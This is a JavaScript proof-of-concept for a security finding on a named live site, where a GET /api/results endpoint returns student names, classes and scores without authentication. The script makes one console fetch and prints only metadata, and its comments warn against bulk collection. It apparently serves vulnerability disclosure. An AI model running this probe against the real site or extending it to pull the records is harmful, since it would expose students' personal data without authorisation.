// poc_new17_results_api.js — NEW-17: unauthenticated results read (DISPLAY)
//
// Target:  https://trithuc500.vercel.app/
// Finding: NEW-17 — V4.8.6 added GET /api/results. A read-only probe without
//          any auth header returned student result records (name, class,
//          score, exam title, device counters) with HTTP 200 and
//          Cache-Control: no-store. The client calls the same endpoint with
//          credentials but no Authorization header.
//
// Type:     DISPLAY. Performs ONE same-origin GET and prints metadata only.
//           No record values are printed, no POST/write is sent, no account is
//           modified. Do not extend this to bulk collection.
//
// Usage: paste into DevTools Console on the target page.

(async () => {
    'use strict';

    const result = {
        ok: true,
        type: 'DISPLAY',
        finding: 'NEW-17',
        status: 'LOCAL_CONFIRMED' ,
        httpStatus: null,
        recordCount: null,
        recordKeys: [],
        note: 'Read-only GET; values intentionally omitted.'
    };

    try {
        const r = await fetch('/api/results', { method: 'GET', credentials: 'same-origin' });
        result.httpStatus = r.status;
        if (r.ok) {
            const j = await r.json().catch(() => ({}));
            if (Array.isArray(j.records)) {
                result.recordCount = j.records.length;
                if (j.records.length && j.records[0] && typeof j.records[0] === 'object') {
                    result.recordKeys = Object.keys(j.records[0]).sort();
                }
            }
        }
    } catch (e) {
        result.note = 'Request unavailable in this context: ' + String(e && e.message || e).slice(0, 80);
    }

    console.table({
        endpoint: '/api/results',
        method: 'GET',
        httpStatus: result.httpStatus,
        recordCount: result.recordCount,
        recordKeys: result.recordKeys.join(', ') || '(none)',
        note: result.note
    });

    return result;
})();
